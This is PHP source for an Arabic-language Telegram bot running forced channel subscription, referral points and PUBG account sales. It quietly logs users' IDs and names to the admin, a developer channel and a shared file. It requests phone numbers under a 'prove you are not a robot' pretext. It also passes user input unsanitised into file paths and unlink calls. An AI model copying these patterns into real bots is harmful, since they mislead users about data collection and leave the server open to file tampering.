$bot_id = bot('getme',['bot'])->result->id;
$ok = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$bot_id])->ok;
if($ch != null and $ok == "true"){
if(preg_match("/(-100)(.)/", $ch) and !preg_match("/(.)(-100)(.)/", $ch)){
	$link = bot("getchat",['chat_id'=>$ch])->result->invite_link;
	if($link != null){
		$link = $link;
$link2 = $link;
		}else{
			$link = bot("exportChatInviteLink",['chat_id'=>$ch])->result;
$link2 = $link;
			}
	}elseif(preg_match("/(@)(.)/", $ch) and !preg_match("/(.)(@)(.)/", $ch)){
		$link = "$ch";
$ch3 = str_replace("@","",$ch);
$link2 = "https://t.me/$ch3";
		}
		$status = bot('getChatMember',['chat_id'=>$ch,'user_id'=>$from_id])->result->status;
if($status != "member" and $status != "creator" and $status != "administrator"){
if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
      ",'reply_to_message_id'=>$message_id,
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
▫️ يجب عليك الإشتراك في قناة البوت أولاً ⚜️؛
▪️ $link
◼️ إشترك في القناة ثم أرسل /start ، 📛
        ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"• اشتراك ♻ ✅",'url'=>$link2]],
]])
]);
		}
		return false;
}
}

		if(in_array($chat_id,$stinggja['stinggja']['band'])){
	if($message){
	bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
عذرا أنت محظور من البوت 😢
      ",'reply_to_message_id'=>$message->message_id, 
]);
	}
	if($data){
		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"
عذرا أنت محظور من البوت 😢
        ",
]);
		}
		return false;
}
$modir = $admin; 
$name = $update->message->from->first_name;
$id = $message->from->id;
if($text == '/start' and $stingggg['twasss'] == 'on' and !in_array($chat_id,$cut) ){
$sales['allllyhya'] += 1;
save($sales);
file_put_contents('../../allbotmoss.txt', $chat_id . "\n",FILE_APPEND);  
file_put_contents("users.txt", $chat_id. "\n",FILE_APPEND);    
bot('sendMessage',[
'chat_id'=>$modir,
'text'=>"٭ تم دخول شخص جديد الى البوت الخاص بك 🕴🏻
                 • ┉ • ┉ • ┉ • ┉ • ┉ •
• معلومات العضو الجديد .

• الاسم :  [$name](tg://user?id=$chat_id) 
• المعرف : [@$user] 
• الايدي :  $id
                 • ┉ • ┉ • ┉ • ┉ • ┉ •
• عدد الاعضاء الكلي : $users
",'disable_web_page_preview'=>true,
'parse_mode'=>"MarkDown",
]); 
jamalusd('sendmessage',[
  'chat_id'=>$jamalcoann,
  'text'=>"
📥| شترك شخص في قناة الاشتراك الاجباري

- القناة : $CHHHH 🧸
             • ┉ • ┉ • ┉ • ┉ • ┉ •
- العضو 🙇‍♂️: $name
- ايدي العضو 👦: $id
- شترك بواسطة بوت 🤖 : @$bott 
             • ┉ • ┉ • ┉ • ┉ • ┉ •
• معرف المطور 👮‍♂️ : @$JAMALJO
• صافي ارباح المطور : ".$usdyhya." 💲
  ",
  ]);
  jamalusd('sendmessage',[
    'chat_id'=>$admin,
    'text'=>"
    • لقد دخله شخص على بوتك 🙇‍♂️
    • معرف البوت : @$bott 🤖
    
    • عموله الارباح : ".$usdyhyaj." 💱
    • صافي الارباح : ".$usdyhya." 💲
    ",
    ]);
}
$name = $update->message->from->first_name;
$id = $message->from->id;
if($text == '/start' and $stingggg['twasss'] == 'off' and !in_array($chat_id,$cut) ){
$sales['allllyhya'] += 1;
save($sales);
file_put_contents('../../allbotmoss.txt', "\n" . $chat_id . "\n",FILE_APPEND);  
file_put_contents("users.txt", $chat_id. "\n",FILE_APPEND);    
jamalusd('sendmessage',[
  'chat_id'=>$jamalcoann,
  'text'=>"
📥| شترك شخص في قناة الاشتراك الاجباري

- القناة : $CHHHH 🧸
             • ┉ • ┉ • ┉ • ┉ • ┉ •
- العضو 🙇‍♂️: $name
- ايدي العضو 👦: $id
- شترك بواسطة بوت 🤖 : @$bott 
             • ┉ • ┉ • ┉ • ┉ • ┉ •
• معرف المطور 👮‍♂️ : @$JAMALJO
• صافي ارباح المطور : ".$usdyhya." 💲
  ",
  ]);
}
if($message and $stingggg['bot'] == 'off' and $chat_id != $admin){
 bot("sendmessage",[
 "chat_id"=>$chat_id,
 "text"=>"*👨🏻‍💻 ¦ مرحبا بك عزيزي 
⚠️ ¦ #نعتذر عن التوقف للبوت
⚙ ¦ فقط تحت الصيانة والتحديث
⏰ ¦ سيتم اعادته للخدمة الساعات القادمة*",
'parse_mode' =>"MARKDOWN",
'reply_to_message_id'=>$message->message_id, 
 ]);return false;
}
if($data and $stingggg['bot'] == 'off' and $chat_id != $admin){
 		bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
 "text"=>"*👨🏻‍💻 ¦ مرحبا بك عزيزي 
⚠️ ¦ #نعتذر عن التوقف للبوت
⚙ ¦ فقط تحت الصيانة والتحديث
⏰ ¦ سيتم اعادته للخدمة الساعات القادمة*",
'parse_mode' =>"MARKDOWN",
'reply_to_message_id'=>$message->message_id, 
 ]);return false;
}
  if(preg_match('/\/(start)(.*)/', $text)){
 $ex = explode(' ', $text);
if($chat_id == $ex[1]){
bot('sendMessage',[
     'chat_id'=>$chat_id,
     'text'=>"",]);
     exit;}}
 if(preg_match('/\/(start)(.*)/', $text )){
  $ex = explode(' ', $text);
$okl = bot('getchat',['chat_id'=>$ex[1]])->result->type;
  if(isset($ex[1])){
   if(!in_array($chat_id, $sales[$chat_id]['id'])){
   	if($okl == "private"){
    $sales[$chat_id]['baageel']=$ex[1];
    $sales[$chat_id]['c'] = 'Ok';
    }
    $sales[$chat_id]['id'][] = $chat_id;
    save($sales);
   }
 }
  if($text && !in_array($from_id,$v)  && !in_array($from_id,$fake) && $stingggg['thkk'] == 'on'){
bot('SendMessage',[
'chat_id'=>$chat_id,
'text'=>"حسناً عزيزي قم بإرسال رقمك للتحقق من انك لست روبوت 💯",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"ارسل جهه اتصالي 📞",'request_contact' => true]],
],
'resize_keyboard' =>true,
]),
'reply_to_message_id'=>$message_id,
]);
return false;}
 if(preg_match("/\/(start)/",$text )){
 	if($sales[$chat_id]['baageel']){
    $sales[$sales[$chat_id]['baageel']]['collect'] += $setengssj;
    save($sales);
    bot('sendmessage',[
    'chat_id'=>$sales[$chat_id]['baageel'],
    'text'=>"- لقد دخل شخص 👤 لرابط الدعوة الخاص بك 😁 ولقد ربحت $setengssj نقطه
      معلومات عنه 🧐:
      ايديه 🆔 : [$from_id](tg://user?id=$from_id)
      معرفه ان وجد ⁦Ⓜ️⁩ : [@$user](tg://user?id=$from_id)
      اسمه ✨ : [$name](tg://user?id=$from_id)
 💰 ¦ عدد نقاطك الان : ".$sales[$sales[$chat_id]['baageel']]['collect'],
 'parse_mode'=>"MarkDown",
    ]);
    bot('sendmessage',[
    'chat_id'=>$chat_id,
'text'=>"
لقد دخلت على رابط صديقك وحصل على $setengssj نقطه 🌚
",
'reply_to_message_id'=>$message->message_id, 
    ]);
        $sales[$chat_id]['baageel']=0;
    save($sales);
    }
$start = str_replace('#name',$name,$start);
$start = str_replace('#id',$chat_id,$start);
$start = str_replace('#user',$userr,$start);
$start = str_replace('#points',$sales[$chat_id]['collect'],$start);
if($stingggg['twassss'] == 'on'){
$admingh = "👮🏻‍♂️ ¦ تواصل مع الادمن";
}else{
$admingh = "";
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
* $start *

**[• 🔥 صنع بوت مماثل خاص بك 🤖](t.me/X_Y_DBOT)**
",
'parse_mode' =>"MARKDOWN",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id, 
   'reply_markup'=>json_encode([
    'inline_keyboard'=>[
     [['text'=>"💰 ¦ نقاطك «".$sales[$chat_id]['collect']."»",'callback_data'=>'nis']], 
     [['text'=>'شراء حساب ببجي','callback_data'=>'alllslaa'],['text'=>'💰 ¦ جمع النقاط','callback_data'=>'col']],
     [['text'=>"شراء نقاط 🏷️",'url'=>"t.me/Sherif_Sami"]],
   ] 
   ])
  ]);
}
}
  if($data == 'back'){
  if($sales[$chat_id]['collect'] == null){
   $sales[$chat_id]['collect'] = 0;
   save($sales);
   }
$start = str_replace('#name',$nammee,$start);
$start = str_replace('#id',$chat_id2,$start);
$start = str_replace('#user',$userrr,$start);
    $start = str_replace('#points',$sales[$chat_id]['collect'],$start);
if($stingggg['twassss'] == 'on'){
$admingh = "👮🏻‍♂️ ¦ تواصل مع الادمن";
}else{
$admingh = "";
}
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"* $start *

**[• 🔥 صنع بوت مماثل خاص بك 🤖](t.me/X_Y_DBOT)**
",
'parse_mode' =>"MARKDOWN",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id, 
   'reply_markup'=>json_encode([
    'inline_keyboard'=>[
     [['text'=>"💰 ¦ نقاطك «".$sales[$chat_id]['collect']."»",'callback_data'=>'nis']], 
     [['text'=>'شراء حساب ببجي','callback_data'=>'alllslaa'],['text'=>'💰 ¦ جمع النقاط','callback_data'=>'col']],
     [['text'=>"شراء نقاط 🏷️",'url'=>"t.me/Sherif_Sami"]],
   ] 
   ])
  ]);
 }
 
 
 if(bot('getMyCommands')->result[0] == true){
  $Commands = [];
  $Commands[] = ['command'=>"start",'description'=>"Start The Bot🤖"];
  $Commands[] = ['command'=>"id",'description'=>"Id 🙇‍♂️"];
  foreach($stingggg['com'] as $code => $comm){
  $Commands[] = ['command'=>$comm['com1'],'description'=>$comm['com2']];
  }
bot('setMyCommands',[
'commands'=>json_encode($Commands)
]);
}

 if(preg_match("/\/(start)/",$text )){
 if($botsjj['alhkok'] == 'off'){
 	if($sales[$chat_id]['baageel']){
    $sales[$sales[$chat_id]['baageel']]['collect'] += $setengssj;
    save($sales);
    bot('sendmessage',[
    'chat_id'=>$sales[$chat_id]['baageel'],
    'text'=>"- لقد دخل شخص 👤 لرابط الدعوة الخاص بك 😁 ولقد ربحت $setengssj نقطه
      معلومات عنه 🧐:
      ايديه 🆔 : [$from_id](tg://user?id=$from_id)
      معرفه ان وجد ⁦Ⓜ️⁩ : [@$user](tg://user?id=$from_id)
      اسمه ✨ : [$name](tg://user?id=$from_id)
 💰 ¦ عدد نقاطك الان : ".$sales[$sales[$chat_id]['baageel']]['collect'],
 'parse_mode'=>"MarkDown",
    ]);
    bot('sendmessage',[
    'chat_id'=>$chat_id,
'text'=>"
لقد دخلت على رابط صديقك وحصل على $setengssj نقطه 🌚
",
'reply_to_message_id'=>$message->message_id, 
    ]);
        $sales[$chat_id]['baageel']=0;
    save($sales);
    }
$start = str_replace('#name',$name,$start);
$start = str_replace('#id',$chat_id,$start);
$start = str_replace('#user',$userr,$start);
    $start = str_replace('#points',$sales[$chat_id]['collect'],$start);
if($stingggg['twassss'] == 'on'){
$admingh = "👮🏻‍♂️ ¦ تواصل مع الادمن";
}else{
$admingh = "";
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
$start
",
'reply_to_message_id'=>$message->message_id, 
   'reply_markup'=>json_encode([
    'inline_keyboard'=>[
     [['text'=>"💰 ¦ نقاطك «".$sales[$chat_id]['collect']."»",'callback_data'=>'nis']], 
     [['text'=>'شراء حساب ببجي','callback_data'=>'alllslaa'],['text'=>'💰 ¦ جمع النقاط','callback_data'=>'col']],
     [['text'=>"شراء نقاط 🏷️",'url'=>"t.me/Sherif_Sami"]],
   ] 
   ])
  ]);
}
}
  if($data == 'back'){
  if($botsjj['alhkok'] == 'off'){
  if($sales[$chat_id]['collect'] == null){
   $sales[$chat_id]['collect'] = 0;
   save($sales);
   }
$start = str_replace('#name',$nammee,$start);
$start = str_replace('#id',$chat_id2,$start);
$start = str_replace('#user',$userrr,$start);
    $start = str_replace('#points',$sales[$chat_id]['collect'],$start);
if($stingggg['twassss'] == 'on'){
$admingh = "👮🏻‍♂️ ¦ تواصل مع الادمن";
}else{
$admingh = "";
}
  bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"$start
",
'reply_to_message_id'=>$message->message_id, 
   'reply_markup'=>json_encode([
    'inline_keyboard'=>[
     [['text'=>"💰 ¦ نقاطك «".$sales[$chat_id]['collect']."»",'callback_data'=>'nis']], 
     [['text'=>'شراء حساب ببجي','callback_data'=>'alllslaa'],['text'=>'💰 ¦ جمع النقاط','callback_data'=>'col']],
     [['text'=>"شراء نقاط 🏷️",'url'=>"t.me/Sherif_Sami"]],
   ] 
   ])
  ]);
 }
 }
$d = date('D');
$day = explode("\n",file_get_contents($d.".txt"));
$fakyou = file_get_contents("fakyou.txt");
$dayurl = explode("\n",file_get_contents($d."url.txt"));
if($d == "Sat"){
unlink("Fri.txt");
}
if($d == "Sun"){
unlink("Sat.txt");
}
if($d == "Mon"){
unlink("Sun.txt");
}
if($d == "Tue"){
unlink("Mon.txt");
}
if($d == "Wed"){
unlink("The.txt");
}
if($d == "Thu"){
unlink("Wed.txt");
}
if($d == "Fri"){
unlink("Thu.txt");
}

//Bot File Share by [ @Sherif_Sami - @php_d - @BlIJJ ]
//Join Channel >>> @Sherif_World
//Join Channel >>> @M_M_D74
//🚷

if($update->callback_query){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $update->callback_query->from->id;
}
if($data == "offerfree"){
           bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
    'text'=>"
ارسل عدد النقاط لأصنع رابط هدية صالح لشخص واحد 😌🎁
      ",'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>'إلغاء ❌','callback_data'=>"c"]],
    ]])
     ]);
   file_put_contents("fakyou.txt","offerfree");
           }
           if(is_numeric($text) and $fakyou == "offerfree"){
            $cod = substr(str_shuffle('abcdefghijklmnopqrstuvwxyz12345689807'),1,10);
            bot('sendmessage',[
      'chat_id'=>$chat_id,
      "text"=>"
تم صنع رابط هدية 🤩 بقيمة $text 
الرابط : 
https://t.me/$me?start=gift=$cod
      ",
'reply_to_message_id'=>$message->message_id, 
      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
     [['text'=>'رجوع 🔙','callback_data'=>"c"]],
     ]])
     ]);
     file_put_contents($cod.".txt",$cod."\n".$text);
     file_put_contents($d.'.txt',$cod."\n",FILE_APPEND);
     unlink("fakyou.txt");
            }
            if(preg_match("/^\/(start)(.*)/s",$text)){

$ex1 = explode(' ',$text);
 $ex = explode('=',$ex1[1]);
if($ex[0] == "gift"){
$cood = explode("\n",file_get_contents($ex[1].".txt"));
$coin = $cood[1];
 if(in_array($ex[1],$day)){
 if(is_file($ex[1].'.txt')){
  bot('sendmessage',[
   'chat_id'=>$admin,
   'text'=>"
لقد دخل شخص لرابط الهدية 😌
معلوماته 
      ايديه : [$from_id](tg://user?id=$chat_id)
      معرفه ان وجد : [@$user](tg://user?id=$chat_id)
      اسمه : [$name](tg://user?id=$chat_id)
   ",'parse_mode'=>"MarkDown"]);
    bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>"
   لقد ربحت $coin نقطة 🤑
   ",'reply_to_message_id'=>$message_id
]);
unlink($ex[1].'.txt');
$sales[$from_id]['collect'] += $coin;
save($sales);
sleep(1);
  }else{
   bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>"
عذرا 😢 تم أخذ الهدية من شخص قبلك 
   ",'reply_to_message_id'=>$message_id,
   ]);
   }
  }else{
   bot('sendmessage',[
   'chat_id'=>$chat_id,
   'text'=>"
عذرا الرابط خاطء 😓
   ",'reply_to_message_id'=>$message_id,
   ]);
   }
 }
}

     if($data == "chs"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📡 ¦ اشترك في القنوات التالة واحصل على $setcoin1 نقطة 💰",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"📡 ¦ القناة الاولى 1",'callback_data'=>"ch1"],['text'=>"📡 ¦ القناة الثانية 2",'callback_data'=>"ch2"]],
[['text'=>"رجوع 🔙",'callback_data'=>"col"]],
]
])
]);
}
if($data == "ch2"){
if($chat_id == in_array($chat_id,$getmoshh1) or $channel == null){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"❎ ¦ لايوجد قناة تمت اضافتها هنا ♨️
⏳ ¦ يرجى المحاولة مره اخرى لاحقا 🗽",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>"col"]],
]
])
]);
}
else
{
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📡 ¦ اشترك في قناة التالية : $channel
💲 ¦ واحصل على $setcoin1 نقطه💰",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"♻️ ¦ تحقق من الإشتراك",'callback_data'=>"yesss"]],
]
])
]);
}
}
if($data == "ch1"){
if($chat_id == in_array($chat_id,$getmoshh) or $channels == null){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"❎ ¦ لايوجد قناة تمت اضافتها هنا ♨️
⏳ ¦ يرجى المحاولة مره اخرى لاحقا 🗽",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>"col"]],
]
])
]);
}
else
{
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"📡 ¦ اشترك في قناة التالية : $channels
💲 ¦ واحصل على $setcoin1 نقطه💰",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"♻️ ¦ تحقق من الإشتراك",'callback_data'=>"yess"]],
]
])
]);
}
}
if($data == "yess"){
$chuser = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$channels&user_id=".$chat_id);
if((strpos($chuser,'"status":"left"') or strpos($chuser,'"Bad Request: USER_ID_INVALID"') or strpos($chuser,'"status":"kicked"')) !== false){
	 bot('answercallbackquery',[
      'callback_query_id' => $update->callback_query->id,
      'text'=>'📛 ¦ اشترك بقناة أولاً',
      'show_alert'=>true,
 ]);
}else{
file_put_contents("getmosh.txt","$chat_id\n",FILE_APPEND);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"🔰 ¦ تم تحقيق من انضمامك بالقناة ✔️
  ⚜️ ¦ حصلت على  $setcoin1  نقطة 💰",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>"col"]],
]
])
]);
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"
يوجد شخص اشترك في قناة التمويل [$channels] ✨
وا حصل على $setcoin1 نقطه 💰
اسمه => [$name](tg://user?id=$chat_id)
عدد نقاطه الان : «".$sales[$chat_id]['collect']."»
",
'parse_mode'=>"MarkDown",
]);
$sales[$chat_id]['collect'] += $setcoin1;
file_put_contents("sales.json",json_encode($sales));
save($sales);
}
}
if($data == "yesss"){
$chuser = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$channel&user_id=".$chat_id);
if((strpos($chuser,'"status":"left"') or strpos($chuser,'"Bad Request: USER_ID_INVALID"') or strpos($chuser,'"status":"kicked"')) !== false){
	 bot('answercallbackquery',[
      'callback_query_id' => $update->callback_query->id,
      'text'=>'📛 ¦ اشترك بقناة أولاً',
      'show_alert'=>true,
 ]);
}else{
file_put_contents("getmosh1.txt","$chat_id\n",FILE_APPEND);
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"🔰 ¦ تم تحقيق من انضمامك بالقناة ✔️
  ⚜️ ¦ حصلت على  $setcoin1  نقطة 💰",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>"col"]],
]
])
]);
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"
يوجد شخص اشترك في قناة التمويل [$channel] ✨
وا حصل على $setcoin1 نقطه 💰
اسمه => [$name](tg://user?id=$chat_id)
عدد نقاطه الان :« ".$sales[$chat_id]['collect']."»
",
'parse_mode'=>"MarkDown",
]);
$sales[$chat_id]['collect'] += $setcoin1;
file_put_contents("sales.json",json_encode($sales));
save($sales);
}
} 
 if($data == "refccoin"){
 	if($stingggg['thoil'] == 'on'){
  bot('EditMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"🆔 ¦ أرسل الان ايدي الشخص الذي تريد ارسال نقاط له وعدد النقاط بسطر ثاني ☑️\nگ مثل 👇
1698873510\n50
💱 ¦ عمولة التحويل هي $ccoin نقطة 💰
        " ,      'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>"رجوع 🔙","callback_data"=>"col"]],
    [['text'=>"💰 ¦ نقاطك «".$sales[$chat_id]['collect']."»",'callback_data'=>'nis']],
    ]])
    ]);
  }
  }
 $addcoin = explode("\n",$text);
  $getchat = bot('getchat',['chat_id'=>$addcoin[0]])->ok;
  if($addcoin[0] and $addcoin[1] and $stingggg['thoil'] == 'on'){
   $b = str_replace('-','',$addcoin[1]);
if(!preg_match("/(-)/", $addcoin[1]) and is_numeric($addcoin[1])){
   if($getchat == "true"){
    $ccoin = $addcoin[1] + $cccoin;
    if($sales[$chat_id]['collect'] >= $ccoin){
     $sales[$chat_id]['collect'] -= $ccoin;
     $sales[$addcoin[0]]['collect'] += $addcoin[1];
     save($sales);
     bot('sendmessage',[
     'chat_id'=>$chat_id, 
 'text' =>"☑️ ¦ تم تحويل ".$addcoin[1]." نقطة ل ".$addcoin[0]." 💰
💸 ¦ نقاطك الان ".$sales[$chat_id]['collect']." نقطة 💰
 ", 
 'reply_to_message_id'=>$message->message_id, 
 'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>"رجوع 🔙","callback_data"=>"col"]],
    ]]),
]);
 bot('sendmessage',[
 'chat_id'=>$addcoin[0], 
 'text' =>"♻️ ¦ تم تحويل لك ".$addcoin[1]." نقطة 💰
🎫 ¦ من الايدي $from_id 🎗
💰 ¦ نقاطك الان ".$sales[$addcoin[0]]['collect']." نقطة 💰
 "]);
     }else{
     bot('sendmessage',[
     'chat_id'=>$chat_id, 
 'text' =>"📛 ¦ نقاطك غير كافية للتحويل 💱
 ",
 'reply_to_message_id'=>$message->message_id,
 'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>"رجوع 🔙","callback_data"=>"col"]],
    [['text'=>"💰 ¦ نقاطك «".$sales[$chat_id]['collect']."»",'callback_data'=>'nis']],
    ]]),
]);
      }
    }else{
     bot('sendmessage',[
     'chat_id'=>$chat_id, 
 'text' =>"📛 ¦ هذا الشخص قد قام بحظر البوت او انه ليس مشترك في البوت ونحن لا نستطيع ارسال له النقاط 💲
 ",
 'reply_to_message_id'=>$message->message_id, 
 'reply_markup'=>json_encode([
    'inline_keyboard'=>[
    [['text'=>"رجوع 🔙","callback_data"=>"col"]],
    ]]),
]);
     }
   }
   }
if($data == "col"){
if($stingggg['thoil'] == 'on'){
$atho = "🔄 ¦ تحويل نقاط";
}else{
$atho = "";
}
if($stingggg['dayis'] == 'on'){
$adayy = "🎁 ¦ هدية يومية";
}else{
$adayy = "";
}
if($stingggg['alroadttt'] == 'on'){
$alrog = "اختصار روابط 🔗";
}else{
$alrog = "";
}
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"🔬 ¦ أختار أحد من خيارات التالية",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
   [['text'=>"🖇️ ¦ رابط الدعوة",'callback_data'=>"ra1"],['text'=>"📡 ¦ اشتراك في القنوات",'callback_data'=>"chs"]],
   [['text'=>"$adayy",'callback_data'=>"kk"],['text'=>"$atho",'callback_data'=>"refccoin"]],
   [['text'=>"$alrog",'callback_data'=>"salessyhya1"]],
   [['text'=>"رجوع 🔙",'callback_data'=>"back"]],
    ] 
   ])
  ]);
 }
 $jjjjssl = $roadt['roadt'];
 if($data == 'salessyhya1' and !$jjjjssl){
 bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
عذرا لا يوجد الان روابط مختصره 😪
 ",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
   [['text'=>"رجوع 🔙",'callback_data'=>"col"]],
    ] 
   ])
  ]);
 }
   if($data == 'salessyhya1' and $jjjjssl){
   if($stingggg['alroadttt'] == 'on'){
  $reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>'عدد نقاط 💸','callback_data'=>'s'],['text'=>'الرابط 🔗️','callback_data'=>'s']];
  foreach($roadt['roadt'] as $code => $road){
  $reply_markup['inline_keyboard'][] = [['text'=>$road['price'],'url'=>$road['name']],['text'=>$road['name'],'url'=>$road['name']]];
  }
if($sales[$chat_id]['collect'] == null){
   $sales[$chat_id]['collect'] = 0;
   save($sales);
  }
$reply_markup['inline_keyboard'][] = [['text'=>'رجوع 🔙','callback_data'=>'col']];
  $reply_markup = json_encode($reply_markup);
  bot('editMessageText',[	

   'chat_id'=>$chat_id,
   'message_id'=>$message_id,
   'text'=>'- الروابط الذي يمكن ان تختصرها 🔗',
   'reply_markup'=>($reply_markup)
  ]);
  $roadt[$chat_id]['mode'] = null;
   file_put_contents("roadt.json",json_encode($roadt));
   exit;
 }
 }

 if($data == 'ra1'){
  bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$message_id,
    'text'=>"\n👋🏻 ¦ هلا بك عزيزي $nammee مجدداً\n😁 ¦ إليك الرابط الخاص بك
https://t.me/$me?start=$chat_id
ستربح نقطة عندما يدخل احد لرابط إحالتك 😉\n📛 ¦ ملاحظة : اذا لم يشترك صديقك بقناة البوت لن تربح 😌\nإذا كان الأمر صعب 🤕 \n\nيمكنك شراء نقاط من مطوري $ 👩🏻‍💻 \n\n📞 ¦ للتواصل
« @$JAMALJO »
",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>"col"]],
    ] 
   ])
  ]);
 }
  if($data == 'alllslaa'){
  bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
if($stingggg['almttor'] == 'on'){
$almtvhg = "الوضع المتطور ❇";
}else{
$almtvhg = "";
}
     bot('sendmessage',[
     'chat_id'=>$chat_id, 
    'text'=>"* حسناً عزيزي اختر وضع عرض السلع الذي تريده 👀 *",
  'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"الوضع الكلاسيكي ✴",'callback_data'=>"salessyhya"],['text'=>"$almtvhg",'callback_data'=>"motatwr"]],
[['text'=>"رجوع 🔙",'callback_data'=>"back"]],
    ] 
   ])
  ]);
 }
if($data == "motatwr"){
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
$num = 0;
$t = $num+1;
$s = $num-1;
$codee = $sales["allcodes"][$num];
$ns = $sales['sales'][$codee]['name'];
$cs = $sales['sales'][$codee]['caption'];
$ps = $sales['sales'][$codee]['price'];
$ph = $sales['sales'][$codee]['photo'];
if(is_numeric($sales['sales'][$codee]['numbers'])){
$n = $sales['sales'][$codee]['numbers'];
}else{
$n = "♾";
}
if($stingggg['saless'] == 'on'){
$a = "الكميه : $n ♻";
}else{
$a = "";
}
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>$ph,
'caption'=>"
اسم السلعه 💌 :  $ns
وصف السلعه 📄 : $cs
سعر السلعه :  $ps
طريقة التسليم : تلقائي ✨
$a",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"شراء السلعة 🔥",'callback_data'=>$codee]],
[['text'=>"التالي",'callback_data'=>"num&&t".$t]],
[['text'=>"رجوع 🔙",'callback_data'=>"alllslaa"]],
],
]),
]);
}
if(preg_match("/num&&t(.*)/",$data,$r)){
$num = $r[1];
$t = $num+1;
$s = $num-1;
$codee = $sales['allcodes'][$num];
$ns = $sales['sales'][$codee]['name'];
$cs = $sales['sales'][$codee]['caption'];
$ps = $sales['sales'][$codee]['price'];
$ph = $sales['sales'][$codee]['photo'];
if(is_numeric($sales['sales'][$codee]['numbers'])){
$n = $sales['sales'][$codee]['numbers'];
}else{
$n = "♾";
}
if($stingggg['saless'] == 'on'){
$a = "الكميه : $n ♻";
}else{
$a = "";
}
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
$sends = bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>$ph,
'caption'=>"
اسم السلعه 💌 :  $ns
وصف السلعه 📄 : $cs
سعر السلعه :  $ps
طريقة التسليم : تلقائي ✨
$a",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"شراء السلعة 🔥",'callback_data'=>$codee]],
[['text'=>"السابق",'callback_data'=>"num&&s".$s],['text'=>"التالي",'callback_data'=>"num&&t".$t]],
[['text'=>"رجوع 🔙",'callback_data'=>"alllslaa"]],
],
]),
]);
if($sends->ok !== true){
$num = count($sales['sales'])-1;
$t = $num+1;
$s = $num-1;
$codee = $sales['allcodes'][$num];
$ns = $sales['sales'][$codee]['name'];
